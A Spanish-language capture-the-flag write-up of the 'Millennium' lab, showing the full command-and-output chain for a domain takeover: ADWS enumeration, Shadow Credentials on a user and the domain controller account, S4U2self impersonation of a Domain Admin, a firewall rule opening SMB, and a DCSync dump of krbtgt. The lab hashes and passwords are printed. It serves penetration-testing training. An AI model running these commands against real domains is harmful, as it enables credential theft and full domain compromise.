# Writeup: Millennium (HackSmarter — Media)

Millennium es una máquina **Media** de Active Directory sobre **Windows Server 2022** que simula un entorno corporativo where las rutas tradicionales de enumeración y movimiento lateral (SMB y LDAP) han sido restringidas mediante firewall y hardening. La cadena de compromiso comienza con una **enumeración sigilosa a través de Active Directory Web Services (ADWS)** en el puerto TCP 9389, utilizando **SOAPHound** para volcar el grafo de BloodHound sin tocar LDAP ni SMB. El análisis del grafo revela que el grupo **Domain Users** tiene **GenericAll** sobre el usuario `sully`, y que `sully` tiene **GenericWrite** sobre el objeto de equipo del controlador de dominio `DC01$`. Aprovechando **Shadow Credentials** (`msDS-KeyCredentialLink`) sobre `sully`, obtenemos su hash NT; con `sully` comprometido, aplicamos la misma técnica sobre `DC01$` para obtener el hash de la cuenta de máquina del DC. Con el TGT de `DC01$`, realizamos un **S4U2self** para suplantar a `athena` (Domain Admin), obtenemos acceso WinRM como ella, abrimos una regla de firewall para SMB y ejecutamos un **DCSync** para extraer el hash de `krbtgt`, logrando el compromiso total del dominio.

---

## Objetivo

Millennium Corp se sometió recientemente a una prueba de penetración que reveló una exposición significativa a través de rutas de ataque basadas en SMB y LDAP. En respuesta, la organización implementó rápidamente restricciones de firewall basadas en host y endureció los servicios de red tradicionales en todo el entorno.

Creyendo que estas mitigaciones eran suficientes, Millennium Corp ha encargado una evaluación de penetración interna de caja negra de seguimiento al equipo de HackSmarter bajo un escenario de brecha asumida.

Como operador, se le coloca dentro de la red corporativa. Las rutas tradicionales de movimiento lateral como SMB y LDAP están fuertemente restringidas o monitoreadas, lo que le obliga a repensar en gran medida las estrategias convencionales de enumeración y ataque de Active Directory.

Su objetivo es:

- Enumerar el entorno bajo condiciones de red restringidas
- Identificar superficies de ataque alternativas más allá de SMB y LDAP
- Escalar privilegios para lograr el compromiso total del dominio y demostrar la post-explotación.

Millennium Corp cree que sus defensas han cerrado las brechas expuestas en su evaluación anterior.

Su tarea es demostrar lo contrario.

---

## Fase 1: Reconocimiento

Escaneo de puertos completo:

```bash
sudo nmap -sS --min-rate 500 -p- -Pn -n -vv 10.1.22.132 -oG allPorts
```

**Resultado (extracto):**

```
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 126
135/tcp   open  msrpc            syn-ack ttl 126
139/tcp   open  netbios-ssn      syn-ack ttl 126
3268/tcp  open  globalcatLDAP    syn-ack ttl 126
3269/tcp  open  globalcatLDAPssl syn-ack ttl 126
3389/tcp  open  ms-wbt-server    syn-ack ttl 126
5985/tcp  open  wsman            syn-ack ttl 126
9389/tcp  open  adws             syn-ack ttl 126
49664/tcp open  unknown          syn-ack ttl 126
49667/tcp open  unknown          syn-ack ttl 126
51061/tcp open  unknown          syn-ack ttl 126
51071/tcp open  unknown          syn-ack ttl 126
51085/tcp open  unknown          syn-ack ttl 126
51104/tcp open  unknown          syn-ack ttl 126
51117/tcp open  unknown          syn-ack ttl 126
```

**Observaciones clave:**

- El puerto **9389 (ADWS)** está abierto. Active Directory Web Services está habilitado por defecto en todos los controladores de dominio desde Windows Server 2008 R2 y expone datos LDAP a través de una pila de protocolos binarios propietarios de Microsoft (MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF).
- El tráfico ADWS viaja encapsulado en tramas SOAP binarias por un puerto poco común, lo que lo hace menos probable de ser inspeccionado o filtrado que el tráfico LDAP clásico por 389 y 636.
- **WinRM (5985)** y **RDP (3389)** están abiertos, lo que permitirá shells interactivas una vez obtenidas credenciales válidas.

Escaneo de servicios y versiones:

```bash
nmap -sCV -p 53,135,139,3268,3269,3389,5985,9389,49664,49667,51061,51071,51085,51104,51117 10.1.22.132 -oN targeted
```

**Resultado (extracto):**

```
Host: DC01; OS: Windows
Domain: MILLENNIUM.CORP
Product_Version: 10.0.20348   ← Windows Server 2022
```

**Hallazgo:** el dominio es `MILLENNIUM.CORP`, el controlador es `DC01.MILLENNIUM.CORP` y corre Windows Server 2022 (build 20348).

---

## Fase 2: Enumeración sigilosa vía ADWS

Ante el bloqueo de SMB y LDAP, la superficie de enumeración se reduce a ADWS. Para explotarla desde Linux utilizamos **SOAPHound**, una herramienta que envuelve las consultas LDAP en mensajes SOAP y las envía al puerto 9389. El servicio ADWS recibe la petición en el controlador de dominio, la desencapsula y la reenvía localmente al servicio LDAP, por lo que en los registros del servidor la consulta parece originarse desde `localhost ([::1])`, dificultando la atribución al atacante.

Ejecutamos la recolección en modo **Stealth** (solo ADWS, sin SMB) para evitar tocar el puerto 445:

```bash
soaphound -d MILLENNIUM.CORP -u tester -p 'Pencil Testers' -dc DC01.MILLENNIUM.CORP -dc-ip 10.1.22.132 -c ADWSOnly --zip
```

**Resultado (extracto):**

```
[!] '-c ADWSOnly' is deprecated and will be removed in v1.5. Use '-c Stealth' instead (same behaviour).
[INFO] Containers collected : 19
[INFO] GPOs collected : 2
[WARNING] Query '(objectClass=msWMI-Som)' returned 0 objects
[INFO] WMI filters collected : 0
[WARNING] Query '(objectClass=trustedDomain)' returned 0 objects
[INFO] Trusts collected: 0
Number of trusts collected: 0
[INFO] [!] Stealth mode: skipping SYSVOL collection (TCP:445). GPO settings, local admins and GPP cpassword will not be in the output.
[INFO] SYSVOL unreachable — GPOChanges will be empty
[INFO] OUs collected : 4
[INFO] Groups collected : 48
[INFO] Users collected : 6
[INFO] Computers collected : 1
Zip file created at : 20261122182128_bloodhound.zip
[+] Collection completed in 16.0s
```

**Hallazgo:** se ha generado un archivo ZIP compatible con BloodHound que contiene 6 usuarios, 48 grupos, 1 equipo, 4 OUs y 2 GPOs. A pesar del modo sigiloso, la información es suficiente para identificar rutas de escalada.

---

## Fase 3: Análisis de BloodHound

Importamos el ZIP en BloodHound. El análisis del grafo revela tres hallazgos críticos:

1. **El grupo `Domain Users` tiene `GenericAll` sobre el usuario `sully`**. Esto significa que cualquier usuario del dominio (incluido `tester`) puede modificar cualquier atributo de `sully`, incluida su contraseña, o escribir en `msDS-KeyCredentialLink` para Shadow Credentials.

2. **El usuario `sully` tiene `GenericWrite` sobre el objeto de equipo `DC01$`**. Este permiso permite escribir en atributos no protegidos del controlador de dominio, abriendo dos rutas principales:
   - **Resource-Based Constrained Delegation (RBCD)**: configurar `msDS-AllowedToActOnBehalfOfOtherIdentity` en `DC01$` para permitir que una cuenta de equipo controlada por el atacante actúe en su nombre, y luego usar S4U2self + S4U2proxy para obtener un ticket de servicio como `athena`.
   - **Shadow Credentials**: escribir un par de claves en `msDS-KeyCredentialLink` de `DC01$` para autenticarse como la cuenta de máquina mediante PKINIT y obtener su hash NT.

3. **`athena` es Domain Admin y Administrador**. Es el objetivo final de la suplantación.

**Nota sobre RBCD:** se intentó la ruta RBCD, pero el paso de suplantación con `getST` falló con el error `KDC_ERR_ETYPE_NOSUPP`, por lo que se optó por Shadow Credentials, que no requiere S4U2proxy y es más directo.

---

## Fase 4: Shadow Credentials sobre `sully`

**Shadow Credentials** abusa del atributo `msDS-KeyCredentialLink`, que permite asociar una clave pública a una cuenta. Si un atacante puede escribir en ese atributo, puede añadir su propia clave y luego autenticarse como la cuenta mediante **PKINIT** (Kerberos con certificado), obteniendo un TGT y, con él, el hash NT de la cuenta.

Como `Domain Users` tiene `GenericAll` sobre `sully`, cualquier usuario del dominio puede escribir en `msDS-KeyCredentialLink`. Usamos **SOAPy**, la implementación en Python de las primitivas ADWS, para añadir la credencial:

```bash
SOAPy MILLENNIUM.CORP/tester:'Pencil Testers'@DC01.MILLENNIUM.CORP --shadow-creds add --shadow-target sully
```

**Resultado (extracto):**

```
[*] Searching for target account: sully
[*] Connecting to DC01.MILLENNIUM.CORP for resource:Enumeration
[+] Target found: CN=Sully,OU=ITOps,OU=Departments,DC=MILLENNIUM,DC=CORP
[*] Generating certificate...
[+] Certificate generated
[*] Generating KeyCredential...
[+] KeyCredential generated with DeviceID: 80b7834e-02d0-e447-5f14-c03a1770c547
[*] Connecting to DC01.MILLENNIUM.CORP for resource:Enumeration
[*] Updating msDS-KeyCredentialLink attribute...
[*] Connecting to DC01.MILLENNIUM.CORP for resource:Resource
[+] Successfully updated msDS-KeyCredentialLink
[*] No filename provided, using: 8ERqiGSk
[*] No password provided, using: MdsmqGkIlsDvAYMHJyl4
[+] Saved PFX certificate: 8ERqiGSk.pfx
[+] PFX password: MdsmqGkIlsDvAYMHJyl4
```

**Hallazgo:** se ha añadido una clave pública al atributo `msDS-KeyCredentialLink` de `sully`. SOAPy ha generado un certificado PFX (`8ERqiGSk.pfx`) protegido con la contraseña `MdsmqGkIlsDvAYMHJyl4`.

Autenticamos con el certificado mediante PKINIT usando `certipy`:

```bash
certipy-ad auth -pfx 8ERqiGSk.pfx -password MdsmqGkIlsDvAYMHJyl4 -dc-ip 10.1.22.132 -domain MILLENNIUM.CORP -username sully
```

**Resultado (extracto):**

```
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'sully.ccache'
[*] Wrote credential cache to 'sully.ccache'
[*] Trying to retrieve NT hash for 'sully'
[*] Got hash for 'sully@millennium.corp': aad3b435b51404eeaad3b435b51404ee:7824282ac1df535de6726dac2b68556e
```

**Hallazgo:** hemos obtenido el TGT de `sully` y su hash NT (`7824282ac1df535de6726dac2b68556e`). Ahora podemos actuar como `sully`.

Con el TGT de `sully`, enumeramos los usuarios del dominio para confirmar el contexto:

```bash
export KRB5CCNAME=sully.ccache
SOAPy MILLENNIUM.CORP/sully@DC01.MILLENNIUM.CORP -k --users
```

**Resultado (extracto):**

```
[*] Using query: (&(objectClass=user)(objectCategory=person))
[*] Using distingushedName: DC=MILLENNIUM,DC=CORP
[*] Collecting ADWS data into .soapy_data; use --show to print BOFHound-compatible output
[*] Collecting ADWS data: 6 unique objects saved (+6 new this page; 6 received across 1 pages)
[*] Base ADWS collection complete: 6 objects; collecting ranged attribute values
[+] ADWS data collection complete: 6 objects saved to .soapy_data; run SOAPy --show
```

**Hallazgo:** la enumeración confirma que el dominio tiene 6 usuarios.

---

## Fase 5: Shadow Credentials sobre `DC01$`

Con `sully` comprometido, disponemos del permiso `GenericWrite` sobre `DC01$`. Aplicamos la misma técnica de Shadow Credentials al objeto de equipo del controlador de dominio:

```bash
SOAPy MILLENNIUM.CORP/sully@DC01.MILLENNIUM.CORP -k --shadow-creds add --shadow-target 'DC01$'
```

**Resultado (extracto):**

```
[*] Searching for target account: DC01$
[+] Target found: CN=DC01,OU=Domain Controllers,DC=MILLENNIUM,DC=CORP
[*] Generating certificate...
[+] Certificate generated
[*] Generating KeyCredential...
[+] KeyCredential generated with DeviceID: f50f6a17-2f75-8c91-9b31-0548e833e467
[*] Updating msDS-KeyCredentialLink attribute...
[+] Successfully updated msDS-KeyCredentialLink
[*] No filename provided, using: 3k93JWKc
[*] No password provided, using: 5bqrHe4w6vhxbvkt7Lpz
[+] Saved PFX certificate: 3k93JWKc.pfx
[+] PFX password: 5bqrHe4w6vhxbvkt7Lpz
```

Autenticamos con el certificado para obtener el TGT y el hash NT de `DC01$`:

```bash
certipy-ad auth -pfx 3k93JWKc.pfx -password 5bqrHe4w6vhxbvkt7Lpz -dc-ip 10.1.22.132 -domain MILLENNIUM.CORP -username 'DC01$'
```

**Resultado (extracto):**

```
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc01.ccache'
[*] Wrote credential cache to 'dc01.ccache'
[*] Trying to retrieve NT hash for 'dc01$'
[*] Got hash for 'dc01$@millennium.corp': aad3b435b51404eeaad3b435b51404ee:4488ea3fcf93e236404f9243f2b214fd
```

**Hallazgo:** hemos obtenido el TGT y el hash NT de la cuenta de máquina `DC01$` (`4488ea3fcf93e236404f9243f2b214fd`). Con el TGT de `DC01$`, podemos solicitar tickets de servicio en nombre de cualquier usuario mediante S4U2self.

---

## Fase 6: S4U2self para suplantar a `athena`

**S4U2self** (Service-for-User to Self) permite a una cuenta de servicio solicitar un ticket de servicio **para sí misma en nombre de otro usuario**, sin necesidad de que el usuario haya iniciado sesión previamente. En este caso, la cuenta de máquina `DC01$` puede solicitar un ticket en nombre de `athena` (Domain Admin).

El flag `-self` indica a `getST` que realice únicamente S4U2self (sin S4U2proxy, que es el que falló con RBCD). El flag `-altservice HTTP/DC01.MILLENNIUM.CORP` modifica el nombre del servicio en el ticket resultante a `HTTP/`, que es el SPN que WinRM requiere en el puerto 5985 para autenticación Kerberos. Sin este flag, el ticket se emitiría para el SPN por defecto de `DC01$`, que WinRM rechazaría.

```bash
export KRB5CCNAME=dc01.ccache
impacket-getST -spn HTTP/DC01.MILLENNIUM.CORP -impersonate athena -dc-ip 10.1.22.132 -k -no-pass 'MILLENNIUM.CORP/DC01$' -self -altservice HTTP/DC01.MILLENNIUM.CORP
```

**Resultado:**

```
[*] Impersonating athena
[*] When doing S4U2self only, argument -spn is ignored
[*] Requesting S4U2self
[*] Changing service from DC01$@MILLENNIUM.CORP to HTTP/DC01.MILLENNIUM.CORP@MILLENNIUM.CORP
[*] Saving ticket in athena@HTTP_DC01.MILLENNIUM.CORP@MILLENNIUM.CORP.ccache
```

**Hallazgo:** hemos obtenido un ticket de servicio para `HTTP/DC01.MILLENNIUM.CORP` con la identidad de `athena`. El ticket está guardado en `athena@HTTP_DC01.MILLENNIUM.CORP@MILLENNIUM.CORP.ccache`.

---

## Fase 7: Acceso WinRM como `athena` y DCSync

Utilizamos el ticket para autenticarnos por WinRM como `athena`:

```bash
export KRB5CCNAME=athena@HTTP_DC01.MILLENNIUM.CORP@MILLENNIUM.CORP.ccache
evil-winrm -i DC01.MILLENNIUM.CORP -r MILLENNIUM.CORP
```

**Resultado (extracto):**

```
*Evil-WinRM* PS C:\Users\ATHENA\Documents> whoami
millennium\athena
*Evil-WinRM* PS C:\Users\ATHENA\Documents> whoami /priv
```

**Resultado de `whoami /priv` (extracto):**

```
SeDebugPrivilege                          Debug programs                     Enabled
SeBackupPrivilege                         Back up files and directories      Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation Enabled
...
```

**Hallazgo:** `athena` es Domain Admin y tiene privilegios como `SeDebugPrivilege` y `SeBackupPrivilege`. Sin embargo, el firewall sigue bloqueando SMB desde nuestra IP. Para permitir la conexión y realizar el DCSync, añadimos una regla de firewall:

```powershell
netsh advfirewall firewall add rule name="SMB OPEN" dir=in action=allow protocol=tcp localport=445 remoteip=any
```

**Resultado:**

```
Ok.
```

Finalmente, ejecutamos un DCSync para extraer el hash de `krbtgt` utilizando las credenciales de `athena` en caché:

```bash
nxc smb DC01.MILLENNIUM.CORP --use-kcache --ntds --user krbtgt
```

**Resultado (extracto):**

```
SMB  DC01.MILLENNIUM.CORP 445  DC01  [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:MILLENNIUM.CORP) (signing:True) (SMBv1:None) (Null Auth:True)
SMB  DC01.MILLENNIUM.CORP 445  DC01  [+] MILLENNIUM.CORP\athena from ccache
SMB  DC01.MILLENNIUM.CORP 445  DC01  [+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB  DC01.MILLENNIUM.CORP 445  DC01  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:
```

**Hallazgo:** hemos extraído el hash de `krbtgt`. Con este hash podemos forjar Golden Tickets y comprometer el dominio de forma persistente.

---

## 📌 Conclusión

1. **Reconocimiento** → DC `MILLENNIUM.CORP` (WS2022), SMB y LDAP filtrados, ADWS (9389) abierto.
2. **Enumeración vía ADWS** → SOAPHound en modo Stealth volcó el grafo de BloodHound sin tocar SMB ni LDAP.
3. **Análisis de BloodHound** → `Domain Users` tiene `GenericAll` sobre `sully`; `sully` tiene `GenericWrite` sobre `DC01$`; `athena` es Domain Admin.
4. **Shadow Credentials sobre `sully`** → obtención del TGT y hash NT de `sully`.
5. **Shadow Credentials sobre `DC01$`** → obtención del TGT y hash NT de la cuenta de máquina del DC.
6. **S4U2self** → ticket de servicio `HTTP/DC01.MILLENNIUM.CORP` impersonando a `athena`.
7. **Acceso WinRM como `athena`** → shell interactiva como Domain Admin.
8. **DCSync** → extracción del hash de `krbtgt` tras abrir una regla de firewall para SMB.

---

## 📚 Lecciones aprendidas

1. **ADWS es una superficie de enumeración sigilosa y efectiva**  
   El puerto 9389 expone los mismos datos que LDAP pero encapsulados en tramas SOAP binarias, lo que evade la mayoría de firmas y filtros basados en LDAP. Herramientas como SOAPHound y SOAPy permiten operar desde Linux sin subir binarios al entorno Windows.

2. **`GenericAll` sobre un usuario permite Shadow Credentials**  
   Escribir en `msDS-KeyCredentialLink` de una cuenta permite autenticarse como ella mediante PKINIT y obtener su hash NT sin conocer su contraseña. Auditar permisos de escritura sobre este atributo y sobre objetos de usuario en general.

3. **`GenericWrite` sobre un objeto de equipo permite RBCD o Shadow Credentials**  
   En un DC, `GenericWrite` sobre la cuenta de máquina permite configurar RBCD (`msDS-AllowedToActOnBehalfOfOtherIdentity`) o Shadow Credentials (`msDS-KeyCredentialLink`). Ambas rutas conducen a la suplantación de un usuario privilegiado.

4. **S4U2self permite a una cuenta de máquina solicitar tickets en nombre de cualquier usuario**  
   Con el TGT de `DC01$`, la cuenta de máquina puede solicitar un ticket para `athena` sin necesidad de S4U2proxy. El flag `-altservice` es clave para ajustar el SPN al servicio objetivo (WinRM).

5. **La enumeración con BloodHound debe adaptarse a las restricciones**  
   Cuando LDAP y SMB están bloqueados, ADWS es la alternativa. Herramientas como SOAPHound y SOAPy permiten recolectar y operar sin tocar los puertos tradicionales.
